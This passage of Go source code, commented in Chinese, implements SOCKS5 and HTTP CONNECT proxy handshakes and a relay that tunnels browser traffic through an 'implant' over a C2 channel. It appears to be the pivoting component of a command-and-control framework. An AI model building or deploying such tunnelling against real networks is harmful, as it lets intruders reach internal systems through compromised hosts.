		conn.Write([]byte{0x05, 0xFF})
		return "", 0, fmt.Errorf("no acceptable auth method")
	}
	conn.Write([]byte{0x05, 0x00})

	// 读取请求: [VER, CMD, RSV, ATYP, DST...]
	reqHeader := make([]byte, 4)
	if _, err = io.ReadFull(reader, reqHeader); err != nil {
		return "", 0, fmt.Errorf("read request header: %w", err)
	}
	if reqHeader[0] != 0x05 {
		return "", 0, fmt.Errorf("bad request version")
	}

	cmd := reqHeader[1]
	if cmd != 0x01 { // 仅支持 CONNECT
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return "", 0, fmt.Errorf("unsupported cmd: %d", cmd)
	}

	addrType := reqHeader[3]
	switch addrType {
	case 0x01: // IPv4
		ip := make([]byte, 4)
		if _, err = io.ReadFull(reader, ip); err != nil {
			return "", 0, fmt.Errorf("read ipv4: %w", err)
		}
		host = net.IP(ip).String()

	case 0x03: // Domain
		domainLen := make([]byte, 1)
		if _, err = io.ReadFull(reader, domainLen); err != nil {
			return "", 0, fmt.Errorf("read domain len: %w", err)
		}
		domain := make([]byte, domainLen[0])
		if _, err = io.ReadFull(reader, domain); err != nil {
			return "", 0, fmt.Errorf("read domain: %w", err)
		}
		host = string(domain)

	case 0x04: // IPv6
		ip := make([]byte, 16)
		if _, err = io.ReadFull(reader, ip); err != nil {
			return "", 0, fmt.Errorf("read ipv6: %w", err)
		}
		host = net.IP(ip).String()

	default:
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return "", 0, fmt.Errorf("unsupported addr type: %d", addrType)
	}

	// 读取端口
	portBytes := make([]byte, 2)
	if _, err = io.ReadFull(reader, portBytes); err != nil {
		return "", 0, fmt.Errorf("read port: %w", err)
	}
	port = binary.BigEndian.Uint16(portBytes)

	return host, port, nil
}

// httpConnectHandshake 执行 HTTP 代理握手（Edge/Chrome 系统代理默认协议）。
// 支持两种请求形式：
//   - "CONNECT host:port HTTP/1.1"：HTTPS 隧道（浏览器访问 https:// 站点）。
//     回复 "HTTP/1.1 200 Connection Established"，之后为透明字节隧道。
//   - "GET http://host:port/path HTTP/1.1"：绝对 URI 正向代理（浏览器访问
//     http:// 站点）。不改写无法直连目标（请求行含绝对 URI 会导致服务器 400），
//     因此把请求行改写为 "GET /path HTTP/1.1" 作为 initialData 交给隧道首发。
// 返回目标地址、端口、改写后的请求头（仅绝对 URI 模式非空）以及上行数据源
// （bufio 流，保证握手阶段已预读的请求体不丢失）。
func httpConnectHandshake(reader io.Reader, conn net.Conn) (host string, port uint16, initialData []byte, upStream io.Reader, err error) {
	br := bufio.NewReader(reader)

	// 读取请求行
	reqLine, err := br.ReadString('\n')
	if err != nil {
		return "", 0, nil, nil, fmt.Errorf("read HTTP request line: %w", err)
	}
	reqLine = strings.TrimRight(reqLine, "\r\n")

	parts := strings.Split(reqLine, " ")
	if len(parts) < 3 {
		return "", 0, nil, nil, fmt.Errorf("malformed request line: %q", reqLine)
	}
	method := parts[0]
	target := parts[1]

	if strings.EqualFold(method, "CONNECT") {
		// ── HTTPS 隧道：CONNECT host:port HTTP/1.1 ──
		host, portStr, serr := net.SplitHostPort(target)
		if serr != nil {
			return "", 0, nil, nil, fmt.Errorf("invalid CONNECT target %q: %w", target, serr)
		}
		p, perr := strconv.ParseUint(portStr, 10, 16)
		if perr != nil {
			return "", 0, nil, nil, fmt.Errorf("invalid CONNECT port %q: %w", portStr, perr)
		}
		port = uint16(p)

		// 读取请求头直至空行（含 \r\n\r\n），丢弃
		for {
			line, rerr := br.ReadString('\n')
			if rerr != nil {
				return "", 0, nil, nil, fmt.Errorf("read CONNECT headers: %w", rerr)
			}
			if line == "\r\n" || line == "\n" {
				break
			}
		}

		// 回复 200 Connection Established
		if _, werr := conn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n")); werr != nil {
			return "", 0, nil, nil, fmt.Errorf("write CONNECT 200: %w", werr)
		}

		return host, port, nil, br, nil
	}

	// ── 绝对 URI 正向代理：GET http://host:port/path HTTP/1.1 ──
	u, uerr := url.Parse(target)
	if uerr != nil || u.Host == "" || u.Scheme == "" {
		return "", 0, nil, nil, fmt.Errorf("not an absolute URI: %q", target)
	}
	host = u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "80"
	}
	p, perr := strconv.ParseUint(portStr, 10, 16)
	if perr != nil {
		return "", 0, nil, nil, fmt.Errorf("invalid URI port %q: %w", portStr, perr)
	}
	port = uint16(p)

	// 收集剩余请求头（从空行前停止），连同改写后的请求行一起作为首批上行数据。
	var headerBuf bytes.Buffer
	headerBuf.WriteString(method)
	headerBuf.WriteString(" ")
	if u.RawQuery != "" {
		headerBuf.WriteString(u.Path + "?" + u.RawQuery)
	} else {
		headerBuf.WriteString(u.Path)
	}
	headerBuf.WriteString(" ")
	headerBuf.WriteString(parts[len(parts)-1]) // HTTP/1.1
	headerBuf.WriteString("\r\n")

	for {
		line, rerr := br.ReadString('\n')
		if rerr != nil {
			return "", 0, nil, nil, fmt.Errorf("read HTTP headers: %w", rerr)
		}
		headerBuf.WriteString(line)
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	// 绝对 URI 模式不回复任何代理应答：浏览器直接等待目标服务器的响应。
	return host, port, headerBuf.Bytes(), br, nil
}

// httpReplyError 向 HTTP CONNECT 客户端发送错误响应。
func httpReplyError(conn net.Conn, code string) {
	fmt.Fprintf(conn, "HTTP/1.1 %s\r\nContent-Length: 0\r\n\r\n", code)
}

// socks5Reply 发送 SOCKS5 响应。
func socks5Reply(conn net.Conn, rep byte) error {
	reply := []byte{0x05, rep, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	_, err := conn.Write(reply)
	return err
}

// socks5ReplyUntilWritable 写入 SOCKS5 成功应答。
// 首次写入失败不立即判定浏览器已断开，而是给一个短暂"可写窗口"重试，
// 区分瞬时背压与对端已 RST/FIN（浏览器等不及 SOCKS 应答超时断开）。
// 重试期间隧道仍存活，植入端已回传的数据由下行 writer 缓冲，不会被误删；
// 若始终不可写（对端已断），返回 false，调用方负责 notifyClose + CloseTunnel。
func socks5ReplyUntilWritable(conn net.Conn) bool {
	if err := socks5Reply(conn, 0x00); err == nil {
		return true
	}
	for i := 0; i < 5; i++ {
		time.Sleep(100 * time.Millisecond)
		if err := socks5Reply(conn, 0x00); err == nil {
			return true
		}
	}
	return false
}

// optimizeTCPConn 设置 TCP 连接参数以获得最佳性能。
func optimizeTCPConn(conn net.Conn) {
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		// 低延迟优先：浏览器 TLS 握手/小包对 Nagle 敏感
		_ = tcpConn.SetNoDelay(true)
		_ = tcpConn.SetKeepAlive(true)
		_ = tcpConn.SetKeepAlivePeriod(30 * time.Second)
		// 放大 socket 缓冲，吸收 C2 下行突发，减少 writeCh overflow
		_ = tcpConn.SetReadBuffer(512 * 1024)
		_ = tcpConn.SetWriteBuffer(512 * 1024)
	}
}

// ─── relay: 双向中继 ──────────────────────────────────────────────────────

// relay 双向中继（对标 nps SOCKS5 的 io.Copy 语义）：
//  上行（浏览器→目标）：读到 EOF/错误即停止上行，不做任何关闭动作；
//  下行（目标→浏览器）：由独立 writer 持续转发，直到植入端 close 帧（目标 EOF）
//    排空下行队列后才整体关闭隧道与浏览器连接。
// 关键：浏览器方向 EOF 后绝不能 CloseWrite/FIN —— 本端是 SOCKS5 连接，
// 本地代理收到 FIN 即视为隧道结束并立即关闭浏览器连接，导致 TLS 握手中途
// ERR_SSL_PROTOCOL_ERROR（HTTPS 全挂、HTTP 因响应已完整而正常）。
func (s *SOCKS5Server) relay(conn net.Conn, upStream io.Reader, tunnel *Tunnel) {
	defer s.tunnelMgr.CloseTunnel(tunnel.ID)

	errc := make(chan error, 2)

	// 浏览器 → 植入端：逐读直发（对标 nps io.Copy 行为）。
	// 不再经 BatchWriter 缓冲：① 去除人为批处理间隔（消除 ~51Mbps 吞吐上限与逐 chunk 延迟）；
	// ② 省去 append+flush 两次冗余拷贝，每读仅一次 EncodeTunnelPacket 拷贝 + writeRaw 原地 XOR。
	bufPtr := relayBufPool.Get().(*[]byte)
	buf := *bufPtr
	defer relayBufPool.Put(bufPtr)

	go func() {
		// 浏览器方向结束（EOF/RST）仅停止上行转发（对标 nps 上行 io.Copy）：
		// 不向 errc 发信号、不触发 relay 收尾；下行由独立 writer 继续完整转发，
		// 直到植入端 close 帧（目标 EOF）才整体关闭。
		// 绝不能 CloseWrite/FIN 浏览器：SOCKS5 本地代理收到 FIN 即视为隧道结束，
		// 会立即关闭浏览器连接 → TLS 握手中途 ERR_SSL_PROTOCOL_ERROR（HTTPS 全挂）。

		for {
			n, err := upStream.Read(buf)
			if n > 0 {
				tunnel.AddBytesIn(uint64(n))
				if tunnelDebug {
					tunDebugf("[TUN] %s UP tunnel=%d len=%d\n", time.Now().Format("15:04:05.000"), tunnel.ID, n)
				}
				if s.sendToImplant != nil {
					pkt := EncodeTunnelPacket(&TunnelPacket{
						Type:      TunnelTypeData,
						TunnelID:  tunnel.ID,
						Data:      buf[:n],
						SessionID: s.sessionID,
					})
					if werr := s.sendToImplant(s.sessionID, pkt); werr != nil {
						return
					}
				}
			}
			if err != nil {
				return
			}
		}
	}()

	// 等待隧道关闭 / 植入端 close 帧 / 服务停止
	go func() {
		select {
		case <-tunnel.Done():
			select {
			case errc <- fmt.Errorf("tunnel closed"):
			default:
			}
		case <-tunnel.CloseReq():
			// 目标侧已关闭且下行数据已全部入队：通知主流程走"排空再关"。
			select {
			case errc <- fmt.Errorf("target closed"):
			default:
			}
		case <-s.stopChan:
			select {
			case errc <- fmt.Errorf("server stopped"):
			default:
			}
		}
	}()

	// 等待任一路结束
	<-errc

	// 诊断：隧道结束汇总（默认关闭，避免浏览器多标签刷屏）
	tunDebugf("[TUN] CLOSE tunnel=%d target=%s:%d bytes_in=%d bytes_out=%d downFrames=%d downBytes=%d\n",
		tunnel.ID, tunnel.TargetAddr, tunnel.TargetPort, tunnel.BytesIn.Load(), tunnel.BytesOut.Load(), tunnel.downCnt.Load(), tunnel.downBytes.Load())

	// 隧道已关闭（如下行写失败 → t.Close()）：浏览器读侧必然已断，无需排空，直接收尾。
	// 必须先通知植入端关闭目标连接：否则植入端 connEntry 残留，readLoop 仍会持续回传
	// 目标数据，到本端时隧道已删除 → 每次浏览器提前断开都会刷一片 DOWN drop，
	// 且植入端连接/goroutine 迟迟不被回收。
	select {
	case <-tunnel.Done():
		s.notifyClose(tunnel.ID)
		return
	default:
	}

	// 浏览器方向已结束（EOF/错误）但隧道仍存活：
	// 对标 nps io.Copy：浏览器方向结束只意味着"不再有上行"，下行仍须完整
	// 转发到目标 EOF。此处不做任何动作（不 CloseWrite/FIN —— SOCKS5 本地
	// 代理收到 FIN 即关闭浏览器连接，TLS 握手会被腰斩），直接等待下方
	// CloseReq（目标 EOF）排空后收尾；目标挂起由超时兜底强制关闭。

	// 关键（修复 DOWN drop / close 帧插队）：
	// 之前此处立即 notifyClose → 植入端提前 finishClose（发 close + 关目标连接），
	// 而目标剩余响应（如 TLS 证书尾部 1280/1238 字节）还在植入端 readLoop 里没投完，
	// 导致 close 帧插到 data 帧前（服务端提前删隧道 → DOWN drop），浏览器收到残缺
	// 证书 → 握手失败 → 重试（日志中 csstools/pss.bdstatic 每次 CONNECT 两次）。
	// 正确做法：浏览器方向结束只意味着"不再有上行"，下行仍须完整转发到目标 EOF。
	// 因此等植入端 close 帧（目标 EOF，FIFO 保证数据已全部入队）再收尾；
	// 目标挂起/长连接等极端情况由超时兜底强制关闭并通知植入端清理。
	select {
	case <-tunnel.CloseReq():
		// 目标已 EOF：下行已全部入队（FIFO），排空下行队列后关闭。
	case <-tunnel.Done():
		return
	case <-s.stopChan:
		return
	case <-time.After(browserEOFWait):
		// 兜底：浏览器已关、目标迟迟不关闭（挂起/长连接），强制收尾并清理植入端。
		s.notifyClose(tunnel.ID)
		return
	}

	// 排空窗口：等待下行队列清空；若浏览器假死（不再收数据），超时兜底强关。
	drainDeadline := time.Now().Add(5 * time.Second)
	for {
		if tunnel.IsQueueEmpty() {
			return
		}
		select {
		case <-tunnel.Done():
			return
		case <-s.stopChan:
			return
		default:
		}
		if time.Now().After(drainDeadline) {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
}
